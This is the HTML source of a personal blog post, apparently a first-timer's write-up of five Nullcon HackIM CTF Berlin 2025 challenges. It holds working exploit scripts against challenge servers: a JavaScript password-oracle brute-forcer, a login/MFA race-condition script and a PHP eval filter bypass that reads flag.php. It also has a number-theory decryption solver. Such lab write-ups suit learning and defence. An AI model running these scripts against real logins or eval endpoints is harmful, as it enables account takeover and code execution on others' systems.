<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-QN5S48G7PJ"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-QN5S48G7PJ');
        }
      </script><meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow"><meta name="author" content="Koustubha naik (Z3KAIx0)">
<meta name="description" content="Writeup of my first CTF --- Nullcon HackIM CTF Berlin 2025 , covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge.">


<link rel="canonical" href="http://localhost:1313/ctf/nullcon-2025/">


<meta property="og:title" content="Nullcon HackIM CTF Berlin 2025">
<meta property="og:type" content="website">
<meta property="og:description" content="Writeup of my first CTF --- Nullcon HackIM CTF Berlin 2025 , covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge.">
<meta property="og:url" content="http://localhost:1313/ctf/nullcon-2025/">
<meta property="og:image" content="http://localhost:1313/posts/CTF/NULLCON/CTF.png">
<meta property="og:author" content="Koustubha naik (Z3KAIx0)">
<meta property="og:site_name" content="Z3KAIx0">
<meta property="og:locale" content="en_US">
<meta property="og:published_time" content="2025-09-07 00:00:00 &#43;0000 UTC">


<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@z3kaix0">
<meta name="twitter:title" content="Nullcon HackIM CTF Berlin 2025">
<meta name="twitter:description" content="Writeup of my first CTF --- Nullcon HackIM CTF Berlin 2025 , covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge.">
<meta name="twitter:image" content="http://localhost:1313/posts/CTF/NULLCON/CTF.png">


<link rel="author" type="text/plain" href="/humans.txt">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" href="/favicon.ico" type="image/x-icon"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<meta name="msapplication-TileImage" content="/mstile-144x144.png">


<meta name="theme-color" content="#4a4f5b">
<meta name="msapplication-TileColor" content="#4a4f5b">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#4a4f5b">


<meta name="language" content="English">
<link rel="alternate" hreflang="en" href="https://koustubha.com/">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "WebSite",
  "name": "Z3KAIx0",
  "url": "https://koustubha.com",
  "description": "Cybersecurity, hacking, and personal notes by Z3KAIx0 ‚Äì learning, breaking things (ethically), and infosec geekery.",
  "author": {
    "@type": "Person",
    "name": "Koustubha",
    "url": "https://github.com/Koustubha-naik",
    "sameAs": [
      "https://twitter.com/z3kaix0",
      "https://linkedin.com/in/koustubha-naik/",
      "https://medium.com/@z3kaix0.offsec"
    ]
  }
}
</script>


  <meta itemprop="name" content="Nullcon HackIM CTF Berlin 2025">
  <meta itemprop="description" content="Writeup of my first CTF --- Nullcon HackIM CTF Berlin 2025 , covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge.">
  <meta itemprop="datePublished" content="2025-09-07T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-09-07T00:00:00+00:00">
  <meta itemprop="wordCount" content="2217">
  <meta itemprop="keywords" content="CTF Writeups,Nullcon HackIM CTF Berlin 2025"><meta property="og:url" content="http://localhost:1313/ctf/nullcon-2025/">
  <meta property="og:site_name" content="Z3KAIx0">
  <meta property="og:title" content="Nullcon HackIM CTF Berlin 2025">
  <meta property="og:description" content="Writeup of my first CTF --- Nullcon HackIM CTF Berlin 2025 , covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-09-07T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-09-07T00:00:00+00:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Nullcon HackIM CTF Berlin 2025">
  <meta name="twitter:description" content="Writeup of my first CTF --- Nullcon HackIM CTF Berlin 2025 , covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge.">

    
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "BlogPosting",
      "headline": "\"Nullcon HackIM CTF Berlin 2025\"",
      "name": "\"Nullcon HackIM CTF Berlin 2025\"",
      "description": "\"Writeup of my first CTF --- Nullcon HackIM CTF Berlin 2025 , covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge.\"",
      "keywords": [
      ],
      "articleBody": "\"Event meta\\rName: Z3KAIx0 Score: 779 Placement: 130th Format: 24h jeopardy Links: Event This was my first CTF competition, and I genuinely enjoyed the entire experience. I learned a lot of new things ‚Äî from exploring different categories of challenges . It was exciting, sometimes frustrating, but overall very rewarding. I came out of it with new skills, more confidence, and plenty of motivation to keep practicing and improving for the next competitions.üôÉ\\n‚ú® 1. Grandmas_notes\\rRecon\\rApp had Register and Login forms. Dashboard allowed saving personal notes (save_note.php). Code snippet from login.php showed: $correct = 0; $limit = min(count($chars), count($stored)); for ($i = 0; $i \\u0026lt; $limit; $i++) { $enteredCharHash = sha256_hex($chars[$i]); if (hash_equals($stored[$i][\\u0026#39;char_hash\\u0026#39;], $enteredCharHash)) { $correct++; } else { break; } } $_SESSION[\\u0026#39;flash\\u0026#39;] = \\u0026#34;Invalid password, but you got {$correct} characters correct!\\u0026#34;; Meaning: the login error reveals how many characters of the password are correct (prefix oracle). Exploit ‚Äî Password Oracle\\rWe can brute-force the admin password one character at a time.\\nYour browser does not support the video tag.\\rSteps\\rOpen /login.php. Open browser DevTools ‚Üí Console. Paste this JS: (async () =\\u0026gt; { const USER = \\u0026#34;admin\\u0026#34;; // target account const CHARSET = \\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$%^\\u0026amp;*\\u0026#34;; const rx = /got\\\\s+(\\\\d+)\\\\s+characters?\\\\s+correct/i; async function score(pw) { const body = new URLSearchParams({ username: USER, password: pw }).toString(); const r = await fetch(\\u0026#34;/login.php\\u0026#34;, { method: \\u0026#34;POST\\u0026#34;, headers: { \\u0026#34;Content-Type\\u0026#34;: \\u0026#34;application/x-www-form-urlencoded\\u0026#34; }, body, credentials: \\u0026#34;include\\u0026#34;, cache: \\u0026#34;no-store\\u0026#34; }); const text = await r.text(); const m = text.match(rx); return m ? parseInt(m[1], 10) : 0; } let prefix = \\u0026#34;\\u0026#34;; while (true) { let found = false; for (const ch of CHARSET) { const n = await score(prefix + ch); if (n === prefix.length + 1) { prefix += ch; console.log(\\u0026#34;[+] prefix =\\u0026#34;, prefix); found = true; break; } } if (!found) break; await new Promise(r =\\u0026gt; setTimeout(r, 150)); // small delay } console.log(\\u0026#34;DONE. Admin password =\\u0026#34;, prefix); })(); This script brute-forces the password character by character and prints the result. Result\\rENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!} ‚ú®2. Pwgen\\rThe site takes the secret flag (a line of letters like F L A G { \\u0026hellip; }) and ‚Äúshuffles‚Äù its letters using a machine that needs a starting number called a seed. They always use the same seed, 0x1337, so the shuffle pattern is always the same‚Äîlike repeating the same dance steps each time. When you visit /?nthpw=N, it doesn‚Äôt keep reshuffling the last result; instead, it applies the N-th shuffle pattern from that same machine to the original flag and shows you that scrambled version.\\nThis is weak because a fixed seed makes the pattern predictable, not truly random. If someone knows the seed (or can see it in the source), they can recreate the exact shuffle steps and then reverse those steps to put every letter back in its original place, revealing the real flag.\\nSource highlights\\rinclude \\u0026#34;flag.php\\u0026#34;; $shuffle_count = abs(intval($_GET[\\u0026#39;nthpw\\u0026#39;])); srand(0x1337); for ($i = 0; $i \\u0026lt; $shuffle_count; $i++) { $password = str_shuffle($FLAG); // shuffle original each time (RNG advances) } echo \\u0026#34;Your password is: \\u0026#39;$password\\u0026#39;\\u0026#34;; Key issues\\nFixed RNG seed ‚áí predictable ‚Äúrandom‚Äù. Each iteration shuffles the original $FLAG (not the previous result), so the N-th output corresponds to the N-th permutation of the same string. Steps I did\\rFetch a shuffled sample (picked N=1):\\ncurl \\u0026#39;http://52.59.124.14:5003/?nthpw=1\\u0026#39; ‚Üí Got a shuffled string.\\nRecreate the server‚Äôs permutation locally using the same seed and Fisher‚ÄìYates logic.\\nInvert the permutation to ‚Äúunshuffle‚Äù the server‚Äôs output back to the original flag.\\nOne-liner used (PHP)\\rphp -r \\u0026#39;srand(0x1337); $N=1; $s=\\u0026#34;PASTE_SHUFFLED_STRING_HERE\\u0026#34;; $L=strlen($s); for($k=0;$k\\u0026lt;$N;$k++){ $p=range(0,$L-1); for($i=$L-1;$i\\u0026gt;0;$i--){ $j=rand(0,$i); [$p[$i],$p[$j]]=[$p[$j],$p[$i]]; } } $o=array_fill(0,$L,\\u0026#34;\\\\0\\u0026#34;); for($pos=0;$pos\\u0026lt;$L;$pos++){ $o[$p[$pos]]=$s[$pos]; } echo implode(\\u0026#34;\\u0026#34;,$o),\\u0026#34;\\\\n\\u0026#34;;\\u0026#39; Why it works (short)\\rFixed seed ‚áí same RNG sequence every time. N-th call to str_shuffle() ‚áí known N-th permutation. Inverting that permutation restores the original index order ‚áí original flag. Flag\\rENO{N3V3r_SHUFFLE_W1TH_STAT1C_S333D_OR_B4D_TH1NGS_WiLL_H4pp3n:-/_0d68ea85d88ba14eb6238776845542cf6fe560936f128404e8c14bd5544636f7} ‚ú®3. Webby\\rRecon\\rLanding page\\rContains a login form.\\nHTML comments leak test creds and a hint:\\n\\u0026lt;!-- user: user1 / password: user1 --\\u0026gt; \\u0026lt;!-- user: user2 / password: user2 --\\u0026gt; \\u0026lt;!-- user: admin / password: admin --\\u0026gt; \\u0026lt;!-- Find me secret here: /?source --\\u0026gt; user1:user1 and user2:user2 ‚Üí login succeeds but empty content.\\nadmin:admin ‚Üí redirects to /mfa (admin requires MFA).\\nProbing /flag or /secret unauthenticated ‚Üí redirects to / (or ‚Äúnot found‚Äù).\\nVisiting /?source=1 dumps the real app (web.py). Key routes:\\nurls = (\\u0026#39;/\\u0026#39;, \\u0026#39;index\\u0026#39;, \\u0026#39;/mfa\\u0026#39;, \\u0026#39;mfa\\u0026#39;, \\u0026#39;/flag\\u0026#39;, \\u0026#39;flag\\u0026#39;, \\u0026#39;/logout\\u0026#39;, \\u0026#39;logout\\u0026#39;) session = web.session.Session(app, web.session.ShelfStore(shelve.open(\\u0026#34;/tmp/session.shelf\\u0026#34;))) FLAG = open(\\u0026#34;/tmp/flag.txt\\u0026#34;).read() Login handler (core flaw)\\rclass index: def POST(self): # ... form validates, creds ok ... session.loggedIn = True session.username = i.username session._save() # (1) loggedIn=True saved if check_mfa(session.get(\\u0026#34;username\\u0026#34;, None)): # admin =\\u0026gt; True session.doMFA = True session.tokenMFA = hashlib.md5( bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(), bcrypt.gensalt(14)) ).hexdigest() session.loggedIn = False session._save() # (2) flips back to False raise web.seeother(\\u0026#34;/mfa\\u0026#34;) return render.login(session.get(\\u0026#34;username\\u0026#34;,None)) MFA + Flag\\rclass mfa: def POST(self): # token must match session.tokenMFA (32 hex); else /logout (kill session) if i.token != session.get(\\u0026#34;tokenMFA\\u0026#34;,None): raise web.seeother(\\u0026#34;/logout\\u0026#34;) session.loggedIn = True session._save() raise web.seeother(\\u0026#39;/flag\\u0026#39;) class flag: def GET(self): if not session.get(\\u0026#34;loggedIn\\u0026#34;,False) or session.get(\\u0026#34;username\\u0026#34;,None) != \\u0026#34;admin\\u0026#34;: raise web.seeother(\\u0026#39;/\\u0026#39;) else: session.kill() return render.flag(FLAG) Root cause: During admin login, the app first saves loggedIn=True and later flips it to False for MFA. Because token generation uses bcrypt (cost 14), there‚Äôs a measurable window between the two saves. Hitting /flag in that window with the same session id returns the flag.\\nExploitation\\rMethod A ‚Äî Browser console racer (no cookie juggling)\\rWorks because the browser automatically includes the current webpy_session_id (HttpOnly) on both requests.\\nOpen the site, press F12 ‚Üí Console, then paste:\\n// Looks for ENO{...} while racing login vs flag in same session (async () =\\u0026gt; { const sleep = ms =\\u0026gt; new Promise(r =\\u0026gt; setTimeout(r, ms)); const delays = [0,10,20,30,40,60,80,120,160,200]; // tweak if needed while (true) { // 1) Start admin login (do not await -\\u0026gt; we want overlap) fetch(\\u0026#34;/\\u0026#34;, { method: \\u0026#34;POST\\u0026#34;, headers: {\\u0026#34;Content-Type\\u0026#34;: \\u0026#34;application/x-www-form-urlencoded\\u0026#34;}, body: \\u0026#34;username=admin\\u0026amp;password=admin\\u0026#34;, credentials: \\u0026#34;include\\u0026#34; }); // 2) Probe /flag at several offsets during bcrypt work for (const d of delays) { await sleep(d); const resp = await fetch(\\u0026#34;/flag\\u0026#34;, {credentials: \\u0026#34;include\\u0026#34;, cache: \\u0026#34;no-store\\u0026#34;}); const text = await resp.text(); const m = text.match(/ENO\\\\{[^}]+\\\\}/); if (m) { console.log(\\u0026#34;FLAG:\\u0026#34;, m[0]); console.log(text); // whole page if desired return; } } } })(); Result:\\nFLAG: ENO{R4Ces_Ar3_3ver1Wher3_Y3ah!!} If it doesn‚Äôt pop quickly, re-run or adjust delays (e.g., add 250‚Äì400ms). Don‚Äôt manually navigate to /mfa during the race.\\n‚ú®4. Slasher\\rProvided source (key parts)\\rif(isset($_POST[\\u0026#39;input\\u0026#39;]) \\u0026amp;\\u0026amp; is_scalar($_POST[\\u0026#39;input\\u0026#39;])) { $input = $_POST[\\u0026#39;input\\u0026#39;]; $input = htmlentities($input, ENT_QUOTES | ENT_SUBSTITUTE, \\u0026#39;UTF-8\\u0026#39;); $input = addslashes($input); $input = addcslashes($input, \\u0026#39;+?\\u0026lt;\\u0026gt;\\u0026amp;v=${}%*:.[]_-0123456789xb `;\\u0026#39;); try { $output = eval(\\u0026#34;$input;\\u0026#34;); } catch (Exception $e) {} } ... \\u0026lt;?php if($output) { ?\\u0026gt; \\u0026lt;div class=\\u0026#34;result\\u0026#34; id=\\u0026#34;resultText\\u0026#34;\\u0026gt;\\u0026lt;?php echo htmlentities($output); ?\\u0026gt;\\u0026lt;/div\\u0026gt; \\u0026lt;?php } ?\\u0026gt; What the filters do\\rhtmlentities() nukes quotes/HTML meta chars.\\naddslashes() escapes \\\\ ' \\u0026quot; NUL.\\naddcslashes(..., '+?\\u0026lt;\\u0026gt;\\u0026amp;v=${}%*:.[]_-0123456789xb \\\\;)` escapes:\\nspace, digits 0‚Äì9, $, {}, =, +, ., _, -, :, ;, %, *, [ ], \\u0026lt; \\u0026gt;, letters v, x, b, backtick. Then it runs: eval(\\u0026quot;$input;\\u0026quot;).\\nConsequences\\rVariables like $FLAG are blocked (the $ is escaped). You can‚Äôt type digits, quotes, spaces, \\u0026quot;.\\u0026quot;, underscore, etc. But you can still use letters, commas, and parentheses ‚Üí function calls like print(), file(), implode(), array(), chr(), count(). Also note: the page only renders the ‚Äúresult‚Äù \\u0026lt;div\\u0026gt; when $output is truthy. print() returns 1, so it guarantees that block shows.\\nRecon / Sanity check\\rProve code execution without using blocked characters:\\ncurl -s -X POST -d \\u0026#39;input=return(true)\\u0026#39; http://52.59.124.14:5011/ \\\\ | sed -n \\u0026#39;s/.*id=\\u0026#34;resultText\\u0026#34;\\u0026gt;\\\\([^\\u0026lt;]*\\\\).*/\\\\1/p\\u0026#39; # -\\u0026gt; 1 This shows our expression is being eval()‚Äôd.\\nTried the obvious constant leak:\\ncurl -s -X POST -d \\u0026#39;input=return(FLAG)\\u0026#39; http://52.59.124.14:5011/ curl -s -X POST -d \\u0026#39;input=return(flag)\\u0026#39; http://52.59.124.14:5011/ No flag ‚Üí likely the flag is not a constant, but in flag.php as a variable (e.g., $FLAG), which we can‚Äôt access directly due to $ being blocked.\\nExploit idea\\rWe can‚Äôt type \\u0026quot;flag.php\\u0026quot; (quotes/digits/. blocked), so we synthesize it:\\narray(true,true,true) ‚Üí count(...) = 3 chr(70) ‚Üí 'F' (but we can‚Äôt type 70) So we build every character via chr(count(array(true,‚Ä¶))) Then implode(array(...)) joins characters into the string. With that, we can do:\\nprint(implode(file(\\u0026#34;flag.php\\u0026#34;))); ‚Ä¶but written only with allowed tokens.\\nExploit (one-liner)\\rURL=\\u0026#34;http://52.59.124.14:5011/\\u0026#34; PAYLOAD=$(python3 - \\u0026lt;\\u0026lt;\\u0026#39;PY\\u0026#39; def enc(s): def block(n): return \\u0026#34;true,\\u0026#34;*(n-1)+\\u0026#34;true\\u0026#34; parts = [f\\u0026#34;chr(count(array({block(ord(c))})))\\u0026#34; for c in s] return \\u0026#34;implode(array(\\u0026#34; + \\u0026#34;,\\u0026#34;.join(parts) + \\u0026#34;))\\u0026#34; code = f\\u0026#34;print(implode(file({enc(\\u0026#39;flag.php\\u0026#39;)})))\\u0026#34; print(code) PY ) curl -s -X POST --data-urlencode \\u0026#34;input=$PAYLOAD\\u0026#34; \\u0026#34;$URL\\u0026#34; | grep -o \\u0026#39;ENO{[^}]*}\\u0026#39; Output:\\nENO{3v4L_0nC3_Ag41n_F0r_Th3_W1n_:-)} Why grep? print() writes the file‚Äôs contents into the HTML (outside the resultText div), so we scrape the flag from the whole page.\\nWhy it works (super short)\\rFilters block typing dangerous characters, but not using safe functions. With letters+parentheses only, we can still call chr/count/array/implode/file/print. Build \\u0026quot;flag.php\\u0026quot; using counts of true; read and print it. eval happily executes the expression. Credits / Notes\\rTrick sometimes called ‚Äúarray(true) counter / chr synthesis‚Äù. Works in many languages/sandboxes where you can still call a few safe functions and build strings without quotes/digits. ‚ú®5.Power Tower\\r---\\r---\\rWhat‚Äôs happening?\\rprimes = {2,3,5,...,97} (all primes \\u0026lt; 100).\\nA left-fold power tower is built:\\nt0 = 1 t1 = 2^t0 = 2 t2 = 3^t1 = 3^2, ‚Ä¶ t25 = 97^(‚Ä¶^(‚Ä¶)) = int_key AES-256 key = the 32-byte big-endian representation of int_key mod n.\\nThe flag is padded with _ to a multiple of 16 and encrypted with AES-ECB.\\nWe only need int_key mod n.\\nMath trick (how to get the key without the flag)\\rFactor n (it‚Äôs not random here):\\nn =\\r127\\r√ó 841705194007\\r√ó 1005672644717572752052474808610481144121914956393489966622615553 (Two smallish primes and one large prime.)\\nCompute the tower mod each prime factor. Use:\\nCarmichael‚Äôs function Œª(p^k) to reduce exponents modulo the multiplicative order. For the tower, the exponents are enormous after the first level, so we add Œª to keep exponents within the correct cycle. Prime-power short-circuit: if base shares a factor with p^k, then a^e ‚â° 0 (mod p^k) for large enough e. Combine the three residues with the Chinese Remainder Theorem (CRT) ‚Üí int_key % n.\\nConvert to 32 bytes ‚Üí AES key.\\nDecrypt the ciphertext in cipher.txt with AES-ECB, then strip trailing underscores.\\nSolver\\rSave as solve.py next to cipher.txt.\\n# solve.py ‚Äî rebuild AES key (int_key mod n) and decrypt cipher.txt from Crypto.Cipher import AES from math import gcd from functools import reduce from sympy import factorint, isprime # Inputs from chall.py / cipher.txt n = 107502945843251244337535082460697583639357473016005252008262865481138355040617 C_hex = open(\\u0026#34;cipher.txt\\u0026#34;,\\u0026#34;r\\u0026#34;).read().strip() # primes \\u0026lt; 100 PRIMES = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97] # Factorization of n (primes) FACTORS_N = [ 127, 841705194007, 1005672644717572752052474808610481144121914956393489966622615553 ] def lcm(a,b): return a // gcd(a,b) * b def lcm_many(xs): return reduce(lcm, xs, 1) def carmichael_lambda_from_factorint(factors: dict) -\\u0026gt; int: # Œª(p^k): odd p =\\u0026gt; p^(k-1)(p-1); for 2: 1,2,2^(k-2) (k\\u0026gt;=3) parts = [] for p, k in factors.items(): if p == 2: if k == 1: parts.append(1) elif k == 2: parts.append(2) else: parts.append(1 \\u0026lt;\\u0026lt; (k-2)) else: parts.append((p**(k-1)) * (p-1)) return lcm_many(parts) def crt_pair(a1, m1, a2, m2): # x ‚â° a1 (mod m1), x ‚â° a2 (mod m2), coprime moduli def eg(a, b): if b == 0: return (1, 0, a) x, y, g = eg(b, a % b) return (y, x - (a // b) * y, g) assert gcd(m1, m2) == 1 s, t, g = eg(m1, m2) x = (a1 * t * m2 + a2 * s * m1) % (m1*m2) return x, m1*m2 def crt_many(residues, moduli): x, m = residues[0], moduli[0] for a, mod in zip(residues[1:], moduli[1:]): x, m = crt_pair(x, m, a, mod) return x def tower_mod(primes, m): \\u0026#34;\\u0026#34;\\u0026#34; Left-fold tower modulo m: t0=1; t_i = primes[i-1] ** t_{i-1} Use Carmichael reductions and prime-power short-circuits. \\u0026#34;\\u0026#34;\\u0026#34; if m == 1: return 0 if not primes: return 1 % m a = primes[-1] prev = primes[:-1] fac = factorint(m) residues = [] moduli = [] for p, k in fac.items(): mk = p**k if a % p == 0: if len(prev) == 0: res = a % mk else: res = 0 # exponent huge ‚áí a^e ‚â° 0 (mod p^k) else: lam = carmichael_lambda_from_factorint({p: k}) e = tower_mod(prev, lam) if len(prev) \\u0026gt;= 1: e += lam # keep exponent in the large cycle res = pow(a, e, mk) residues.append(res) moduli.append(mk) return crt_many(residues, moduli) # Sanity: factors are prime for pfac in FACTORS_N: assert isprime(pfac) # int_key % n by CRT over prime factors residues = [tower_mod(PRIMES, pfac) for pfac in FACTORS_N] int_key_mod_n = crt_many(residues, FACTORS_N) # 32-byte big-endian key key = int_key_mod_n.to_bytes(32, \\u0026#39;big\\u0026#39;) # Decrypt cipher = bytes.fromhex(C_hex) pt = AES.new(key, AES.MODE_ECB).decrypt(cipher) flag = pt.rstrip(b\\u0026#39;_\\u0026#39;).decode(\\u0026#39;utf-8\\u0026#39;, \\u0026#39;ignore\\u0026#39;) print(\\u0026#34;Flag:\\u0026#34;, flag) Run\\rpython3 -m pip install pycryptodome sympy python3 solve.py Output\\nFlag: ENO{m4th_tr1ck5_c4n_br1ng_s0me_3ffic13ncy} Why it works (intuitive)\\rYou only care about int_key (mod n). If n = p1 * p2 * p3 (primes), compute int_key (mod p1), int_key (mod p2), int_key (mod p3) separately. Exponent arithmetic modulo a prime power uses Carmichael‚Äôs function to shrink the exponent (recursively). When base shares a factor with p^k, big exponents collapse to 0 mod p^k. CRT stitches the residues back into a single value modulo n. Turn that into 32 bytes ‚Üí AES-256 key. Decrypt with AES-ECB. Lessons learned\\rNever try to compute monster towers directly‚Äîwork modulo small factors. Carmichael/Euler reductions and CRT are must-know tools in crypto CTFs. AES-ECB has no IV; once the key is known, decryption is trivial. Custom padding ('_') is easy to strip after decrypting. Credit / Tools\\rPython, pycryptodome (AES), sympy (factorization utilities). Classic number theory: Carmichael Œª, CRT. Last updated: 07 Sep 2025\\n\"",
      "wordCount":  2217 ,
      "inLanguage": "en",
      "datePublished": "2025-09-07T00:00:00Z",
      "dateModified": "2025-09-07T00:00:00Z",
      "author": {
        "@type": "Person",
        "name": "Koustubha naik (Z3KAIx0)",
        "url": ""
      },
      "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http:\/\/localhost:1313\/ctf\/nullcon-2025\/"
      },
      "publisher": {
        "@type": "Organization",
        "name": "Z3KAIx0",
        "logo": {
          "@type": "ImageObject",
          "url": "http:\/\/localhost:1313\/images\/favicon.ico"
        }
      }
    }
    </script>
<title>Nullcon HackIM CTF Berlin 2025</title>
<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" media="screen" href="http://localhost:1313/css/style.min.07da89721d6bb10e3d55ebb9d102927f32211e0e1c890958642a14fd65f8313d.css" integrity="sha256-B9qJch1rsQ49Veu50QKSfzIhHg4ciQlYZCoU/WX4MT0=" crossorigin="anonymous"></head>
<body id="page">

  
  
  <link rel="stylesheet"
        href="/css/ctf.b38b16648d6cd628b334a18f8d1ac2c61a8618babb4fc95c620f101b3ed2a019752a8240ced6c748a5db9dccc7b318a92e03c425ee99245b59670318055f9eb9.css"
        integrity="sha512-s4sWZI1s1iizNKGPjRrCxhqGGLq7T8lcYg8QGz7SoBl1KoJAztbHSKXbnczHsxipLgPEJe6ZJFtZZwMYBV&#43;euQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />

  <div class="ctf wrap">

    <p class="back"><a href="/ctf/">‚Üê Back to CTF</a></p>

    <header class="ctf-hero">
      <h1>Nullcon HackIM CTF Berlin 2025</h1>
      <p class="muted">07 Sep 2025</p>
    </header>

    
      
      
      
        
        
      
        
        
      
        
        
      
        
        
      
        
        
      

      <section class="ctf-box">
        <div class="box-head" style="justify-content:space-between">
          <h2>Challenge summary</h2>
          <span class="badge">5/5 solved ‚Ä¢ 778/778 pts</span>
        </div>

        <div class="scroll-box">
          <table class="ctf-table">
            <thead>
              <tr>
                <th>#</th>
                <th>Category</th>
                <th>Name</th>
                <th class="nowrap">Points</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody>
              
                
                
                
                <tr class="rowclick" tabindex="0" onclick="location.href='#web-grandmas-notes-100'">
                  <td class="nowrap">1</td>
                  <td class="nowrap">Web</td>
                  <td><a class="rowlink" href="#web-grandmas-notes-100">Grandmas_notes</a></td>
                  <td class="nowrap">100</td>
                  <td class="nowrap">‚úÖ Solved</td>
                </tr>
              
                
                
                
                <tr class="rowclick" tabindex="0" onclick="location.href='#web-pwgen-100'">
                  <td class="nowrap">2</td>
                  <td class="nowrap">Web</td>
                  <td><a class="rowlink" href="#web-pwgen-100">pwgen</a></td>
                  <td class="nowrap">100</td>
                  <td class="nowrap">‚úÖ Solved</td>
                </tr>
              
                
                
                
                <tr class="rowclick" tabindex="0" onclick="location.href='#web-webby-203'">
                  <td class="nowrap">3</td>
                  <td class="nowrap">Web</td>
                  <td><a class="rowlink" href="#web-webby-203">webby</a></td>
                  <td class="nowrap">203</td>
                  <td class="nowrap">‚úÖ Solved</td>
                </tr>
              
                
                
                
                <tr class="rowclick" tabindex="0" onclick="location.href='#web-slasher-275'">
                  <td class="nowrap">4</td>
                  <td class="nowrap">Web</td>
                  <td><a class="rowlink" href="#web-slasher-275">Slasher</a></td>
                  <td class="nowrap">275</td>
                  <td class="nowrap">‚úÖ Solved</td>
                </tr>
              
                
                
                
                <tr class="rowclick" tabindex="0" onclick="location.href='#Powertower-100'">
                  <td class="nowrap">5</td>
                  <td class="nowrap">Crypto</td>
                  <td><a class="rowlink" href="#Powertower-100">Power Tower</a></td>
                  <td class="nowrap">100</td>
                  <td class="nowrap">‚úÖ Solved</td>
                </tr>
              
            </tbody>
          </table>
        </div>
      </section>
    

    <div class="content">
      <h2 id="event-meta">Event meta</h2>
<ul>
<li><strong>Name:</strong> Z3KAIx0</li>
<li><strong>Score:</strong> 779</li>
<li><strong>Placement:</strong>  130th</li>
<li><strong>Format:</strong> 24h jeopardy</li>
<li><strong>Links:</strong> <a href="https://ctf.nullcon.net/">Event</a></li>
</ul>
<hr>
<img src="/posts/CTF/NULLCON/nullcon-ctf.png" style="width:1000px;">
<hr>
<p>This was my first CTF competition, and I genuinely enjoyed the entire experience. I learned a lot of new things  ‚Äî from exploring different categories of challenges . It was exciting, sometimes frustrating, but overall very rewarding. I came out of it with new skills, more confidence, and plenty of motivation to keep practicing and improving for the next competitions.üôÉ</p>
<hr>
<div id="web-grandmas-notes-100" style="text-align: center;">
  <h1>‚ú® 1. Grandmas_notes</h1>
</div>
<hr>
<img src="/posts/CTF/NULLCON/grandmasnotes.png" style="width:500px;">
<hr>
<h2 id="recon">Recon</h2>
<ul>
<li>App had <strong>Register</strong> and <strong>Login</strong> forms.</li>
<li>Dashboard allowed saving personal notes (<code>save_note.php</code>).</li>
<li>Code snippet from <code>login.php</code> showed:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$correct <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>$limit <span style="color:#f92672">=</span> <span style="color:#a6e22e">min</span>(<span style="color:#a6e22e">count</span>($chars), <span style="color:#a6e22e">count</span>($stored));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $limit; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    $enteredCharHash <span style="color:#f92672">=</span> <span style="color:#a6e22e">sha256_hex</span>($chars[$i]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">hash_equals</span>($stored[$i][<span style="color:#e6db74">&#39;char_hash&#39;</span>], $enteredCharHash)) {
</span></span><span style="display:flex;"><span>        $correct<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
